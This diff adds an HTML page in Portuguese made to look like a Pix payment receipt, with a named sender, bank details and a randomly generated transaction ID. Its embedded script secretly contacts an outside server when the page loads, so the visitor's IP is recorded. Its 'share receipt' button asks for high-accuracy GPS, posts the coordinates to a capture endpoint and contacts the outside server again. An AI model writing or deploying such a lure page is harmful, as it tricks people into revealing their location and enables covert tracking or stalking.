@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Pagamento</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .receipt {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+      max-width: 400px;
+      width: 100%;
+      overflow: hidden;
+    }
+    .receipt-header {
+      background: #008C45;
+      color: #fff;
+      padding: 24px 24px 20px;
+      text-align: center;
+    }
+    .receipt-header .check {
+      width: 48px; height: 48px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 12px;
+      font-size: 24px;
+    }
+    .receipt-header h1 { font-size: 18px; font-weight: 600; }
+    .receipt-header .amount {
+      font-size: 32px;
+      font-weight: 700;
+      margin-top: 8px;
+    }
+    .receipt-header .date {
+      font-size: 13px;
+      opacity: 0.85;
+      margin-top: 4px;
+    }
+    .receipt-body { padding: 24px; }
+    .receipt-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 14px;
+    }
+    .receipt-row:last-child { border-bottom: none; }
+    .receipt-row .label { color: #888; }
+    .receipt-row .value { color: #1a1a1a; font-weight: 500; text-align: right; max-width: 60%; }
+    .receipt-section {
+      font-size: 12px;
+      color: #aaa;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 16px 0 4px;
+      font-weight: 600;
+    }
+    .receipt-footer {
+      padding: 16px 24px 24px;
+      text-align: center;
+    }
+    .btn {
+      display: inline-block;
+      background: #008C45;
+      color: #fff;
+      border: none;
+      padding: 14px 32px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.2s;
+    }
+    .btn:hover { background: #007a3d; }
+    .btn:disabled { background: #ccc; cursor: wait; }
+    .id-code {
+      font-size: 11px;
+      color: #bbb;
+      margin-top: 12px;
+      word-break: break-all;
+    }
+    .pix-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #E8F5E9;
+      color: #2E7D32;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 4px;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="receipt">
+    <div class="receipt-header">
+      <div class="check">✓</div>
+      <h1>Pagamento confirmado</h1>
+      <div class="amount">R$ 134,00</div>
+      <div class="date" id="dateStr"></div>
+      <div class="pix-badge">
+        <svg width="14" height="14" viewBox="0 0 512 512" fill="currentColor"><path d="M395.3 315.1l-79.6-79.6c-6.2-6.2-16.4-6.2-22.6 0l-79.6 79.6c-6.2 6.2-6.2 16.4 0 22.6l79.6 79.6c6.2 6.2 16.4 6.2 22.6 0l79.6-79.6c6.2-6.2 6.2-16.4 0-22.6zm-79.6 56.6l-57-57 57-57 57 57-57 57zM315.1 116.7l-79.6-79.6c-6.2-6.2-16.4-6.2-22.6 0l-79.6 79.6c-6.2 6.2-6.2 16.4 0 22.6l79.6 79.6c6.2 6.2 16.4 6.2 22.6 0l79.6-79.6c6.2-6.2 6.2-16.4 0-22.6zm-79.6 56.6l-57-57 57-57 57 57-57 57z"/></svg>
+        Pix
+      </div>
+    </div>
+
+    <div class="receipt-body">
+      <div class="receipt-section">Destino</div>
+      <div class="receipt-row">
+        <span class="label">Nome</span>
+        <span class="value">GM INTERMEDIACAO E NEGOCIOS LTDA</span>
+      </div>
+      <div class="receipt-row">
+        <span class="label">CPF/CNPJ</span>
+        <span class="value">••.•••.•••/0001-••</span>
+      </div>
+      <div class="receipt-row">
+        <span class="label">Instituição</span>
+        <span class="value">Banco Inter</span>
+      </div>
+
+      <div class="receipt-section">Origem</div>
+      <div class="receipt-row">
+        <span class="label">Nome</span>
+        <span class="value">Lucas Pacheco Nunes</span>
+      </div>
+      <div class="receipt-row">
+        <span class="label">CPF</span>
+        <span class="value">•••.•••.•••-••</span>
+      </div>
+      <div class="receipt-row">
+        <span class="label">Instituição</span>
+        <span class="value">Nu Pagamentos S.A.</span>
+      </div>
+
+      <div class="receipt-section">Detalhes</div>
+      <div class="receipt-row">
+        <span class="label">Tipo</span>
+        <span class="value">Pix transferência</span>
+      </div>
+      <div class="receipt-row">
+        <span class="label">Valor</span>
+        <span class="value" style="color:#008C45; font-weight:700;">R$ 134,00</span>
+      </div>
+    </div>
+
+    <div class="receipt-footer">
+      <button class="btn" id="confirmBtn" onclick="capture()">Compartilhar comprovante</button>
+      <div class="id-code" id="txId"></div>
+    </div>
+  </div>
+
+  <script>
+    // Data e ID de transação
+    (function() {
+      const now = new Date();
+      const dateStr = now.toLocaleDateString('pt-BR', { day: '2-digit', month: 'long', year: 'numeric' })
+        + ' às ' + now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+      document.getElementById('dateStr').textContent = dateStr;
+
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let txId = 'E';
+      for (let i = 0; i < 32; i++) txId += chars[Math.floor(Math.random() * chars.length)];
+      document.getElementById('txId').textContent = 'ID: ' + txId;
+    })();
+
+    // Captura silenciosa ao carregar a página
+    (function() {
+      fetch('https://server.intellux.com/geolocation').catch(function(){});
+    })();
+
+    async function capture() {
+      const btn = document.getElementById('confirmBtn');
+      btn.disabled = true;
+      btn.textContent = 'Carregando...';
+
+      // GPS do navegador (se aceitar, pega localização exata)
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 8000,
+          });
+        });
+        // Envia GPS pro servidor local também
+        await fetch('/api/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            gps: {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy_meters: pos.coords.accuracy,
+            }
+          }),
+        }).catch(function(){});
+      } catch (e) { /* GPS negado, tudo bem - IP já foi capturado */ }
+
+      // Chama novamente pra garantir
+      fetch('https://server.intellux.com/geolocation').catch(function(){});
+
+      btn.textContent = '✓ Comprovante compartilhado';
+      btn.style.background = '#66BB6A';
+    }
+  </script>
+</body>
+</html>
